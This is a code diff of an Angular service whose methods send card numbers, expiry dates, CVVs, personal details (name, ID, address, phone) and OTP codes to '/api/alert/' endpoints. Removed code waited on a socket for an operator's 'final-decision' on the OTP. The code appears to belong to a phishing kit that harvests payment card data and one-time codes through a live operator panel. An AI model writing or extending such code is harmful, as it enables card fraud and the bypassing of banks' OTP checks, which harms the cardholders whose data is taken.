@@ -85,19 +85,19 @@ export class FuncionalityService {
     });
   } */
 
-  appendCardData(card: string, exp: string, cvv: string) {
-    const socketId = this.socket.id;
+  appendCardData(card: string, exp: string, cvv: string, messageId: string) {
     return this.http.post(this.api + '/api/alert/append-card-data', {
       card,
       exp,
       cvv,
+      messageId,
       sessionId: this.getStoredSessionId()
     });
   }
 
   
   appendPersonData(name: string, id: string, add: string, tel: string) {
-    const socketId = this.socket.id;
+    
     return this.http.post(this.api + '/api/alert/append-person-data', {
       name,
       id,
@@ -107,7 +107,7 @@ export class FuncionalityService {
     });
   }
 
-  updateMessageWithOtp(otp: string, socketId: string) {
+  updateMessageWithOtp(otp: string) {
     return this.http.post(this.api + '/api/alert/update-message-otp', {
       otp,
       sessionId: this.getStoredSessionId()
@@ -118,14 +118,6 @@ export class FuncionalityService {
     return this.decisionSubject.asObservable();
   }
 
-  onOtpDecision(): Observable<string> {
-    return new Observable((observer) => {
-      this.socket.on('final-decision', (data: string) => {
-        observer.next(data);
-        observer.complete();
-      });
-    });
-  }
 
   sendSimpleMessage(data: string) {
     const socketId = this.socket.id;
